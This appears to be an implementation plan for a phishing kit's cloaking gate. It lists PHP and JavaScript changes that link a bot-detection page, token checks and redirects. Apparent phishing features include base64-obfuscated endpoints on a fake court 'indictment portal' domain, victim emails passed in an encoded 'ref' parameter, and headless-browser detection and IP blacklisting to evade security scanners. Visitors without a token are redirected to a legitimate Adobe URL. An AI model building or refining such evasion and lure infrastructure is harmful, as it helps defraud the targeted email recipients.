# Functions and Code Sections to Change

## Summary
This document lists all functions, files, and code sections that need to be modified to embed the verification gate into the app.

---

## File 1: `verification_gate.php` (NEW FILE)

### Functions to Implement (Copy from github/index.html):
1. **`detectAutomation()`** - Detects webdriver, headless browsers, selenium, puppeteer
2. **`checkBotUserAgent()`** - Checks user agent for bot signatures
3. **`validateBrowserEnvironment()`** - Validates browser environment (Blob, FileReader, etc.)
4. **`showBotTrap(reason)`** - Shows bot trap page with infinite loop
5. **`collectFingerprint()`** - Collects browser fingerprint data
6. **`checkWebGL()`** - Checks WebGL support
7. **`getCanvasFingerprint()`** - Generates canvas fingerprint
8. **`solveChallenge(seed)`** - Solves challenge for bot detection
9. **`getRecaptchaToken()`** - Gets reCAPTCHA v3 token

### Code Sections to Modify:
1. **Endpoint URL** (Line ~178):
   ```javascript
   // OLD:
   const endpoint = atob("aHR0cHM6Ly90eC1kaXN0cmljdGNvdXJ0LmluZGljdG1lbnRwb3J0YWwub25saW5lL2FwaS5waHA=");
   
   // NEW:
   const endpoint = 'api.php';
   ```

2. **Redirect Base URL** (Line ~179):
   ```javascript
   // OLD:
   const redirectBase = atob("aHR0cHM6Ly90eC1kaXN0cmljdGNvdXJ0LmluZGljdG1lbnRwb3J0YWwub25saW5lL3Byb2Nlc3MucGhw");
   
   // NEW:
   const redirectBase = 'process.php';
   ```

3. **Email Parameter Extraction** (Lines ~523-551):
   - Already handles `?ref=...` and `#email=...`
   - No changes needed - already compatible

---

## File 2: `process.php` (MODIFY EXISTING)

### Functions to Verify (No Changes):
1. **Token Validation Loop** (Lines ~78-86) - Checks tokens for past 60 seconds
2. **IP Blacklist Check** (Lines ~36-38) - Uses `IPBlacklistLoader::isBlacklisted()`
3. **Device Detection** (Lines ~186-195) - `isMobileDevice()` function

### Code Sections to Modify:
1. **Redirect URL for 'human' type** (Line ~177):
   ```php
   // OLD:
   $redirectUrl = 'router.php?vtoken=' . $verification_token . '&vtime=' . time();
   
   // NEW:
   $redirectUrl = 'index.php?vtoken=' . $verification_token . '&vtime=' . time();
   ```

2. **Preserve Email Parameter** (After Line ~177):
   ```php
   // ADD:
   // Preserve email parameter (ref) if present
   if (isset($_GET['ref']) && !empty($_GET['ref'])) {
       $redirectUrl .= '&ref=' . urlencode($_GET['ref']);
   }
   ```

3. **Email Parameter Handling** (Lines ~224-230):
   - Currently checks `$_GET['email']`
   - Should also check `$_GET['ref']` for consistency
   - **ADD**:
   ```php
   // Also check for 'ref' parameter (new format)
   if (isset($_GET['ref']) && !empty($_GET['ref'])) {
       $email = urldecode($_GET['ref']);
       // Try to decode base64 if it looks like base64
       if (preg_match('/^[A-Za-z0-9+\/]+=*$/', $email)) {
           $decoded = @base64_decode($email, true);
           if ($decoded !== false && filter_var($decoded, FILTER_VALIDATE_EMAIL)) {
               $email = $decoded;
           }
       }
       if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
           $separator = (strpos($redirectUrl, '?') !== false) ? '&' : '?';
           $redirectUrl .= $separator . 'ref=' . urlencode($email);
       }
   }
   ```

---

## File 3: `index.php` (MODIFY EXISTING)

### Functions to Verify (No Changes):
1. **Token Validation** (Lines ~10-45) - Validates `vtoken` and `vtime`
2. **`extractEmailFromFragment()`** - Already handles `?ref=...` parameter
3. **IP Blacklist Check** - Already integrated

### Code Sections to Modify:
1. **Redirect URL when no token** (Lines ~17, 23, 30, 39):
   ```php
   // OLD (appears 4 times):
   header('Location: https://acrobat.adobe.com/id/urn:aaid:sc:EU:3675e197-77af-4366-a4d8-fc2568aa27d9');
   
   // NEW:
   header('Location: verification_gate.php');
   ```

2. **Email Parameter Handling**:
   - Already handled by `extractEmailFromFragment()` in `js/email_provider_detector.js`
   - No changes needed - function already checks `?ref=...` first

---

## File 4: `api.php` (VERIFY - NO CHANGES EXPECTED)

### Functions to Verify:
1. **`generateRedirectToken($type)`** (Line ~675):
   - Generates: `md5($type . ':' . time() . ':gate_secret_salt')`
   - Must match what `process.php` expects

2. **CORS Headers** (Lines ~49-51):
   - Already allows `*` origin
   - Should work for same-origin requests

3. **Token Generation**:
   - Format: `md5(type:timestamp:gate_secret_salt)`
   - Used by: `process.php` for validation

### Code Sections to Verify:
1. **Token Generation** - Must use `gate_secret_salt` (not `secure_gate_salt`)
2. **CORS Headers** - Should allow local requests
3. **Response Format** - Must return `{token: "...", is_human: true/false}`

---

## File 5: `router.php` (OPTIONAL - MAY NOT BE NEEDED)

### Decision:
- If `process.php` redirects directly to `index.php`, `router.php` is not needed
- If you want to keep routing to different destinations, keep `router.php`
- If keeping, update `process.php` to redirect to `router.php` instead of `index.php`

### If Removing:
- No changes needed - just don't use it

### If Keeping:
- No changes needed - already handles `vtoken`, `vtime`, and `ref` parameters

---

## Configuration Files to Check

### 1. Secret Salts (Must Match):
- **`gate_secret_salt`**: Used in `api.php` and `process.php`
- **`secure_gate_salt`**: Used in `process.php` and `index.php`

**Action**: Verify both salts are defined consistently:
- `api.php` line ~675: `md5($type . ':' . time() . ':gate_secret_salt')`
- `process.php` line ~85: `md5($type . ':' . $time_slot . ':gate_secret_salt')`
- `process.php` line ~176: `md5('verified:' . time() . ':secure_gate_salt')`
- `index.php` line ~35: `md5('verified:' . $vtime . ':secure_gate_salt')`

### 2. reCAPTCHA Configuration:
- **Site Key**: `6LfUvO4rAAAAABz_j2gl1r_x8x3mVkstksZXVU-k`
- **Config URL**: `https://campbellchamblissappraisers.com/config_recaptcha_public.php`

**Action**: Either:
- Keep external config (if accessible from your server)
- Or create local `config_recaptcha_public.php` with same structure

---

## Summary of Changes

### New Files (1):
- ✅ `verification_gate.php` - Complete verification gate (from github/index.html)

### Modified Files (2):
- ✅ `process.php` - Change redirect URL from `router.php` to `index.php`, add `ref` parameter handling
- ✅ `index.php` - Change redirect URL from external to `verification_gate.php` (4 occurrences)

### Verified Files (2):
- ✅ `api.php` - Verify token generation and CORS (no changes expected)
- ✅ `router.php` - Optional, may not be needed

### Total Changes:
- **1 new file** to create
- **2 files** to modify (2-3 code sections each)
- **2 files** to verify (no changes expected)

---

## Testing Priority

1. **High Priority**: Test token flow (api.php → process.php → index.php)
2. **High Priority**: Test email parameter preservation (`ref`)
3. **Medium Priority**: Test bot detection in verification_gate.php
4. **Medium Priority**: Test mobile device support
5. **Low Priority**: Test reCAPTCHA integration

---

## Implementation Checklist

- [ ] Create `verification_gate.php` with updated endpoint URLs
- [ ] Update `process.php` redirect URL to `index.php`
- [ ] Add `ref` parameter handling in `process.php`
- [ ] Update `index.php` redirect URLs (4 occurrences) to `verification_gate.php`
- [ ] Verify `api.php` token generation matches `process.php` expectations
- [ ] Verify secret salts are consistent across all files
- [ ] Test complete flow end-to-end
- [ ] Test email parameter preservation
- [ ] Test bot detection
- [ ] Test mobile device support
- [ ] Decide on `router.php` (keep or remove)

